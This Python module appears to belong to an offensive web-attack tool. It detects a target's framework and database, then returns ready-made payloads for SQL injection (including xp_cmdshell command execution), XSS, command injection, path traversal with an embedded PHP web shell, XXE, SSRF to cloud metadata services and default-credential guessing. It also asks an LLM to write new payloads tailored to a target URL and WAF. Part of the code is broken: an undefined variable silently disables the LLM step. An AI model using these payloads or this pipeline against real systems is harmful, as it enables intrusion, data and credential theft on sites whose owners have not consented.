"""
SMART PAYLOAD GENERATOR — AI-Powered Payload Generation
=========================================================
Generate custom payloads based on tech stack target using LLM.

Usage:
    from engines.payload_generator import payload_generator

    payloads = payload_generator.generate("sqli", "Laravel", "MySQL")
    payloads = payload_generator.generate("xss", "React", "Node.js")
"""

import json
from typing import List, Dict, Optional
from urllib.parse import urlparse

# Creative payload via LLM + fetched public corpora
def _creative_payloads(vuln_type: str, url: str, tech: str, error_msg: str, waf_hint: str, count: int = 5) -> List[Dict[str, str]]:
    # 1. Try fetched PayloadsAllTheThings cache
    try:
        from core.payload_fetcher import load_cached
        cached = load_cached(vuln_type)
        if cached:
            return [{"payload": p, "description": f"Fetched {vuln_type}", "severity": "High"} for p in cached[:count]]
    except Exception:
        pass
    # 2. LLM generate new payload based on context (like senior hacker)
    try:
        from core.model_registry import build_chat_llm
        from langchain_core.messages import HumanMessage, SystemMessage
        import os
        pref = None
        if os.environ.get("NEXUS_LOCAL_LLM_ENABLED", "").lower() in ("1", "true"):
            from core.model_registry import _local_registry
            lr = _local_registry()
            if lr:
                pref = lr[0]["id"]
        llm = build_chat_llm(pref)
        prompt = f"Generate {count} novel {vuln_type} payloads for {tech} at {url}. WAF: {waf_hint[:200]} Last error: {error_msg[:300]}. Return JSON: [{{\"payload\":\"...\",\"description\":\"...\"}}]"
        resp = llm.invoke([SystemMessage(content="You are payload generator. Output JSON only."), HumanMessage(content=prompt)])
        import json, re
        m = re.search(r"\[.*\]", str(resp.content), re.DOTALL)
        if m:
            data = json.loads(m.group(0))
            if isinstance(data, list):
                return [{"payload": d.get("payload",""), "description": d.get("description","creative"), "severity": "High"} for d in data[:count] if d.get("payload")]
    except Exception:
        pass
    return []


def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


def _logger():
    try:
        from custom_tools import exec_logger
        return exec_logger
    except Exception:
        return None


# ── Tech Stack Detection Hints ────────────────────────────────────────────────

TECH_SIGNATURES = {
    "php": {
        "headers": ["X-Powered-By: PHP", "Server: Apache", "Set-Cookie: PHPSESSID"],
        "body": ["php", "phpmyadmin", "laravel", "symfony", "wordpress", "drupal"],
        "extensions": [".php", ".phtml", ".php5"],
    },
    "nodejs": {
        "headers": ["X-Powered-By: Express", "Server: Express", "X-Request-Id"],
        "body": ["next", "react", "vue", "angular", "node"],
        "extensions": [".js", ".mjs", ".cjs"],
    },
    "python": {
        "headers": ["Server: WSGI", "Server: gunicorn", "Server: uvicorn"],
        "body": ["django", "flask", "fastapi", "python", "csrfmiddlewaretoken"],
        "extensions": [".py", ".pyc"],
    },
    "java": {
        "headers": ["Server: Apache-Coyote", "X-Powered-By: Servlet", "Set-Cookie: JSESSIONID"],
        "body": ["spring", "struts", "tomcat", "jboss", "java"],
        "extensions": [".jsp", ".do", ".action"],
    },
    "ruby": {
        "headers": ["X-Powered-By: Phusion Passenger", "Server: Puma"],
        "body": ["rails", "ruby", "sinatra"],
        "extensions": [".rb", ".erb"],
    },
    "dotnet": {
        "headers": ["X-Powered-By: ASP.NET", "X-AspNet-Version"],
        "body": ["aspx", "aspxerror", "dotnet", ".net"],
        "extensions": [".aspx", ".asp", ".cshtml"],
    },
}

# ── Database Detection Hints ──────────────────────────────────────────────────

DB_SIGNATURES = {
    "mysql": ["mysql", "MySQL", "MariaDB", "mysqli"],
    "postgresql": ["postgresql", "PostgreSQL", "pgsql"],
    "mssql": ["MSSQL", "Microsoft SQL", "mssql"],
    "oracle": ["Oracle", "ORA-"],
    "sqlite": ["SQLite", "sqlite"],
    "mongodb": ["MongoDB", "mongo", "bson"],
    "redis": ["Redis", "redis"],
}


class PayloadGenerator:
    """
    AI-powered payload generator based on tech stack target.
    """

    def __init__(self):
        pass

    def detect_tech_stack(self, url: str) -> Dict[str, str]:
        """
        Detect tech stack from target URL based on response headers dan body.
        """
        import requests
        logger = _logger()

        detected = {"framework": "unknown", "language": "unknown", "database": "unknown"}

        try:
            r = requests.get(url, timeout=10, verify=False, allow_redirects=True)
            headers_str = str(dict(r.headers)).lower()
            body = r.text.lower()

            # Detect language/framework
            for tech, signatures in TECH_SIGNATURES.items():
                for sig in signatures.get("headers", []):
                    if sig.lower() in headers_str:
                        detected["language"] = tech
                        break
                for sig in signatures.get("body", []):
                    if sig.lower() in body:
                        detected["framework"] = sig.lower()
                        break

            # Detect database
            for db, sigs in DB_SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in headers_str or sig.lower() in body:
                        detected["database"] = db
                        break

            if logger:
                logger.add_log("Payload Generator", "SUCCESS",
                    f"Tech stack detected: {detected}")

        except Exception as e:
            if logger:
                logger.add_log("Payload Generator", "WARNING",
                    f"Tech stack detection failed: {str(e)[:100]}")

        return detected

    def generate(
        self,
        vuln_type: str,
        url: str = "",
        framework: str = "",
        database: str = "",
        context: str = "",
        count: int = 20,
        exec_logger=None,
    ) -> List[Dict[str, str]]:
        """
        Generate custom payloads based on context.

        Args:
            vuln_type: "sqli", "xss", "ssti", "cmdi", "lfi", "idor"
            url: Target URL (optional, for detect tech stack)
            framework: Tech framework (optional)
            database: Database type (optional)
            context: Additional context (optional)
            count: Jumlah payload that diinginkan

        Returns:
            List of {"payload": str, "description": str, "severity": str}
        """
        if exec_logger:
            exec_logger.add_log("Payload Generator", "START",
                f"Generating {vuln_type} payloads")

        # Auto-detect tech stack kalau gak dikasih
        if url and (not framework or not database):
            tech = self.detect_tech_stack(url)
            if not framework:
                framework = tech.get("framework", "unknown")
            if not database:
                database = tech.get("database", "unknown")

        # Generate payloads based on vuln_type dan context
        payloads = self._generate_for_type(vuln_type, framework, database, context, count)

        if exec_logger:
            exec_logger.add_log("Payload Generator", "SUCCESS",
                f"Generated {len(payloads)} payloads for {vuln_type} ({framework}/{database})")

        return payloads

    def _generate_for_type(
        self,
        vuln_type: str,
        framework: str,
        database: str,
        context: str,
        count: int,
    ) -> List[Dict[str, str]]:
        """
        Internal: generate payloads based on type dan context.
        """
        generators = {
            "sqli": self._gen_sqli,
            "xss": self._gen_xss,
            "ssti": self._gen_ssti,
            "cmdi": self._gen_cmdi,
            "lfi": self._gen_lfi,
            "idor": self._gen_idor,
            "xxe": self._gen_xxe,
            "ssrf": self._gen_ssrf,
            "auth_bypass": self._gen_auth_bypass,
        }

        generator = generators.get(vuln_type, self._gen_generic)
        base = generator(framework, database, context, count)
        # Append creative payloads (fetched + LLM-generated) for senior-level creativity
        try:
            creative = _creative_payloads(vuln_type, url, framework, context, "", max(3, count // 4))
            # Dedupe by payload string
            seen = {p["payload"] for p in base}
            for c in creative:
                if c["payload"] not in seen:
                    base.append(c)
                    seen.add(c["payload"])
        except Exception:
            pass
        return base[:count + 5]

    def _gen_sqli(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        # Framework-specific payloads
        if framework in ["laravel", "php"]:
            payloads.extend([
                {"payload": "1' AND '1'='1", "description": "Laravel/PHP basic auth bypass", "severity": "High"},
                {"payload": "1' UNION SELECT NULL,NULL,NULL--", "description": "Laravel UNION injection", "severity": "Critical"},
                {"payload": "1' AND (SELECT COUNT(*) FROM users)>0--", "description": "Laravel user table enumeration", "severity": "High"},
                {"payload": "1'; SELECT SLEEP(5);--", "description": "Laravel time-based blind", "severity": "Critical"},
            ])

        if framework in ["django", "python"]:
            payloads.extend([
                {"payload": "1' AND '1'='1", "description": "Django ORM bypass", "severity": "High"},
                {"payload": "1' UNION SELECT NULL,NULL,NULL--", "description": "Django UNION injection", "severity": "Critical"},
                {"payload": "1' AND (SELECT COUNT(*) FROM auth_user)>0--", "description": "Django user table enumeration", "severity": "High"},
            ])

        if framework in ["spring", "java"]:
            payloads.extend([
                {"payload": "1' AND '1'='1", "description": "Spring JDBC bypass", "severity": "High"},
                {"payload": "1' UNION SELECT NULL,NULL,NULL FROM DUAL--", "description": "Spring UNION injection", "severity": "Critical"},
                {"payload": "1'; WAITFOR DELAY '0:0:5'--", "description": "Spring time-based blind (MSSQL)", "severity": "Critical"},
            ])

        # Database-specific payloads
        if database == "mysql":
            payloads.extend([
                {"payload": "1' AND SLEEP(5)--", "description": "MySQL time-based blind", "severity": "Critical"},
                {"payload": "1' UNION SELECT NULL,NULL,NULL,NULL FROM information_schema.tables--", "description": "MySQL schema enumeration", "severity": "Critical"},
                {"payload": "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "description": "MySQL error-based version", "severity": "Critical"},
            ])

        elif database == "postgresql":
            payloads.extend([
                {"payload": "1' AND (SELECT pg_sleep(5))::text='1'--", "description": "PostgreSQL time-based blind", "severity": "Critical"},
                {"payload": "1' UNION SELECT NULL,NULL,NULL FROM pg_tables--", "description": "PostgreSQL table enumeration", "severity": "Critical"},
            ])

        elif database == "mssql":
            payloads.extend([
                {"payload": "1'; WAITFOR DELAY '0:0:5'--", "description": "MSSQL time-based blind", "severity": "Critical"},
                {"payload": "1' UNION SELECT NULL,NULL,NULL FROM sys.tables--", "description": "MSSQL table enumeration", "severity": "Critical"},
                {"payload": "1'; EXEC xp_cmdshell('whoami')--", "description": "MSSQL RCE", "severity": "Critical"},
            ])

        # Generic payloads
        payloads.extend([
            {"payload": "' OR '1'='1", "description": "Generic auth bypass", "severity": "High"},
            {"payload": "' UNION SELECT NULL--", "description": "Generic UNION injection", "severity": "Critical"},
            {"payload": "' AND 1=1--", "description": "Generic boolean true", "severity": "High"},
            {"payload": "' AND 1=2--", "description": "Generic boolean false", "severity": "High"},
            {"payload": "1' OR '1'='1' LIMIT 1--", "description": "Generic auth bypass with limit", "severity": "High"},
        ])

        return payloads[:count]

    def _gen_xss(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        # React/Node.js specific
        if framework in ["react", "next", "node"]:
            payloads.extend([
                {"payload": "{{7*7}}", "description": "React SSTI check", "severity": "High"},
                {"payload": "{document.cookie}", "description": "React template injection", "severity": "High"},
                {"payload": "${7*7}", "description": "React template literal injection", "severity": "High"},
            ])

        # Generic XSS
        payloads.extend([
            {"payload": "<script>alert(1)</script>", "description": "Classic script tag", "severity": "High"},
            {"payload": "<img src=x onerror=alert(1)>", "description": "Image onerror", "severity": "High"},
            {"payload": "<svg onload=alert(1)>", "description": "SVG onload", "severity": "High"},
            {"payload": "javascript:alert(1)", "description": "JavaScript URI", "severity": "High"},
            {"payload": "'-alert(1)-'", "description": "Event handler injection", "severity": "High"},
            {"payload": "\"><script>alert(1)</script>", "description": "Attribute breakout", "severity": "High"},
            {"payload": "<details open ontoggle=alert(1)>", "description": "Details tag", "severity": "High"},
            {"payload": "<body onload=alert(1)>", "description": "Body onload", "severity": "High"},
        ])

        return payloads[:count]

    def _gen_ssti(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        if framework in ["django", "python"]:
            payloads.extend([
                {"payload": "{{7*7}}", "description": "Django/Jinja2 SSTI", "severity": "Critical"},
                {"payload": "${7*7}", "description": "Django template syntax", "severity": "Critical"},
                {"payload": "{%7b7*7%7d}", "description": "URL-encoded Django SSTI", "severity": "Critical"},
            ])

        if framework in ["spring", "java"]:
            payloads.extend([
                {"payload": "${7*7}", "description": "Spring EL injection", "severity": "Critical"},
                {"payload": "#{7*7}", "description": "Spring EL alternative", "severity": "Critical"},
                {"payload": "*{7*7}", "description": "Spring EL collection", "severity": "Critical"},
            ])

        if framework in ["ruby", "rails"]:
            payloads.extend([
                {"payload": "<%= 7*7 %>", "description": "ERB template injection", "severity": "Critical"},
                {"payload": "<% 7*7 %>", "description": "ERB code execution", "severity": "Critical"},
            ])

        # Generic SSTI
        payloads.extend([
            {"payload": "{{7*7}}", "description": "Generic SSTI (Jinja2/Twig)", "severity": "Critical"},
            {"payload": "${7*7}", "description": "Generic SSTI (EL/Freemarker)", "severity": "Critical"},
            {"payload": "<%= 7*7 %>", "description": "Generic SSTI (ERB)", "severity": "Critical"},
            {"payload": "#{7*7}", "description": "Generic SSTI (Spring)", "severity": "Critical"},
        ])

        return payloads[:count]

    def _gen_cmdi(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        # Linux payloads
        payloads.extend([
            {"payload": ";id", "description": "Linux: execute id command", "severity": "Critical"},
            {"payload": "|id", "description": "Linux: pipe id command", "severity": "Critical"},
            {"payload": "`id`", "description": "Linux: backtick execution", "severity": "Critical"},
            {"payload": "$(id)", "description": "Linux: dollar execution", "severity": "Critical"},
            {"payload": ";cat /etc/passwd", "description": "Linux: file read", "severity": "Critical"},
            {"payload": "|whoami", "description": "Linux: current user", "severity": "Critical"},
        ])

        # Windows payloads
        payloads.extend([
            {"payload": "&whoami", "description": "Windows: current user", "severity": "Critical"},
            {"payload": "|whoami", "description": "Windows: pipe whoami", "severity": "Critical"},
            {"payload": "& type C:\\Windows\\win.ini", "description": "Windows: file read", "severity": "Critical"},
        ])

        # Blind (time-based)
        payloads.extend([
            {"payload": ";sleep 5", "description": "Blind: sleep 5 seconds", "severity": "Critical"},
            {"payload": "|sleep 5", "description": "Blind: pipe sleep", "severity": "Critical"},
            {"payload": "$(sleep 5)", "description": "Blind: dollar sleep", "severity": "Critical"},
        ])

        return payloads[:count]

    def _gen_lfi(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        payloads.extend([
            {"payload": "../../../../etc/passwd", "description": "Linux file read", "severity": "Critical"},
            {"payload": "../../../../etc/passwd%00", "description": "Null byte bypass", "severity": "Critical"},
            {"payload": "..%2f..%2f..%2f..%2fetc/passwd", "description": "URL encoded path traversal", "severity": "Critical"},
            {"payload": "....//....//....//....//etc/passwd", "description": "Double dot bypass", "severity": "Critical"},
            {"payload": "php://filter/convert.base64-encode/resource=/etc/passwd", "description": "PHP filter wrapper", "severity": "Critical"},
            {"payload": "file:///etc/passwd", "description": "File protocol wrapper", "severity": "Critical"},
            {"payload": "expect://id", "description": "PHP expect wrapper", "severity": "Critical"},
            {"payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==", "description": "PHP data wrapper", "severity": "Critical"},
        ])

        # Windows
        payloads.extend([
            {"payload": "..\\..\\..\\..\\windows\\win.ini", "description": "Windows file read", "severity": "Critical"},
            {"payload": "..%5c..%5c..%5c..%5cwindows%5cwin.ini", "description": "Windows URL encoded", "severity": "Critical"},
        ])

        return payloads[:count]

    def _gen_idor(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        payloads.extend([
            {"payload": "/api/users/1", "description": "Sequential ID test", "severity": "High"},
            {"payload": "/api/users/0", "description": "Zero ID test", "severity": "High"},
            {"payload": "/api/users/admin", "description": "Admin ID test", "severity": "High"},
            {"payload": "/api/users/2", "description": "Adjacent ID test", "severity": "High"},
            {"payload": "/api/users/999", "description": "High ID test", "severity": "High"},
            {"payload": "/api/users/me", "description": "Self-reference test", "severity": "High"},
            {"payload": "/api/users/../admin", "description": "Path traversal IDOR", "severity": "High"},
        ])

        return payloads[:count]

    def _gen_xxe(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        payloads.extend([
            {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>', "description": "Classic XXE file read", "severity": "Critical"},
            {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root><data>&xxe;</data></root>', "description": "Windows XXE file read", "severity": "Critical"},
            {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><data>&xxe;</data></root>', "description": "XXE via SSRF AWS metadata", "severity": "Critical"},
        ])

        return payloads[:count]

    def _gen_ssrf(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        payloads.extend([
            {"payload": "http://169.254.169.254/latest/meta-data/", "description": "AWS metadata endpoint", "severity": "Critical"},
            {"payload": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata endpoint", "severity": "Critical"},
            {"payload": "http://127.0.0.1/", "description": "Localhost access", "severity": "High"},
            {"payload": "http://localhost/", "description": "Localhost alias", "severity": "High"},
            {"payload": "file:///etc/passwd", "description": "File protocol", "severity": "Critical"},
            {"payload": "http://[::1]/", "description": "IPv6 localhost", "severity": "High"},
        ])

        return payloads[:count]

    def _gen_auth_bypass(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        payloads = []

        # SQL auth bypass
        payloads.extend([
            {"payload": "admin'--", "description": "SQL comment bypass", "severity": "Critical"},
            {"payload": "admin' OR '1'='1", "description": "SQL OR bypass", "severity": "Critical"},
            {"payload": "' OR 1=1#", "description": "MySQL comment bypass", "severity": "Critical"},
        ])

        # Default credentials
        payloads.extend([
            {"payload": "admin:admin", "description": "Default admin:admin", "severity": "Critical"},
            {"payload": "admin:password", "description": "Default admin:password", "severity": "Critical"},
            {"payload": "admin:123456", "description": "Default admin:123456", "severity": "Critical"},
            {"payload": "root:root", "description": "Default root:root", "severity": "Critical"},
            {"payload": "test:test", "description": "Default test:test", "severity": "High"},
        ])

        return payloads[:count]

    def _gen_generic(self, framework: str, database: str, context: str, count: int) -> List[Dict[str, str]]:
        return [
            {"payload": "test", "description": "Generic test input", "severity": "Info"},
        ]


# Global instance
payload_generator = PayloadGenerator()
